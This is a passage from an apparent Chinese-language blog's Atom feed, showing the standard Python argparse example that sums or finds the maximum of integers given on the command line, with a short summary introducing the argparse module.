class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Process some integers.'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'integers'</span>, metavar=<span class="string">'N'</span>, type=int, nargs=<span class="string">'+'</span>,</span><br><span class="line">                   help=<span class="string">'an integer for the accumulator'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--sum'</span>, action=<span class="string">'store_const'</span>,</span><br><span class="line">                   const=sum, default=max,</span><br><span class="line">                   help=<span class="string">'sum the integers (default: find the max)'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(args.sum(args.integers))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  argparse模块是python中用于解析命令行参数和选项的标准模块，方便用户在命令行中输入参数。&lt;/p&gt;
&lt;h2 id=&quot;argparse使用&quot;&gt;&lt;a href=&quot;#argparse使用&quot; class=&quot;headerlink&quot; title=&quot;argparse使用&quot;&gt;&lt;/a&gt;argparse使用&lt;/h2&gt;
    
    </summary>
    
      <category term="python" scheme="https://fl4g.cn/categories/python/"/>
    
    
      <category term="argparse" scheme="https://fl4g.cn/tags/argparse/"/>
    
  </entry>
  
</feed>
